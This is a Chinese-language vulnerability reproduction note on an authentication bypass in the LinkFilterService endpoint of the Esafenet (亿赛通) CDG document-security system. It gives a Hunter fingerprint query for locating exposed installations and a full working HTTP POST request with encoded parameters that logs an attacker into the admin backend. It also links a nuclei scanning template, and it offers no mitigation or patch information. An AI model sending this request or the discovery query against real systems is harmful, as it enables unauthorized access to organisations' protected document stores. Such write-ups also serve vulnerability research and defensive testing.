# 亿赛通电子文档安全管理系统LinkFilterService存在身份认证绕过漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统LinkFilterService存在身份认证绕过漏洞，攻击者可通过该漏洞绕过身份认证进入系统后台。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/9fnUX648F-CLwGAI/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-472735.png)

# 四、漏洞复现
```java
POST /CDGServer3/LinkFilterService HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=BCC78770D02EC6AB78EA995E2555A2C1; JSESSIONID=C64DC678312F69EFCDADCC742CF861BB
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
```

![1702917036931-32f2efde-09b3-4af7-b1ff-2496b8443173.png](./img/9fnUX648F-CLwGAI/1702917036931-32f2efde-09b3-4af7-b1ff-2496b8443173-251671.png)

![1702916915310-737010ff-3342-4e2e-b45d-4a3bf6b28598.png](./img/9fnUX648F-CLwGAI/1702916915310-737010ff-3342-4e2e-b45d-4a3bf6b28598-758130.png)

![1702916934484-4afe6db6-a57e-4e26-8eda-0f096164b942.png](./img/9fnUX648F-CLwGAI/1702916934484-4afe6db6-a57e-4e26-8eda-0f096164b942-539350.png)

nuclei脚本

[亿赛通电子文档安全管理系统-linkfilterservice-逻辑漏洞.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621694642-61db836c-1106-4792-8570-cba42f27bd2a.yaml)



> 更新: 2024-04-20 22:01:34  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xdgbwbrsy3d7v4i8>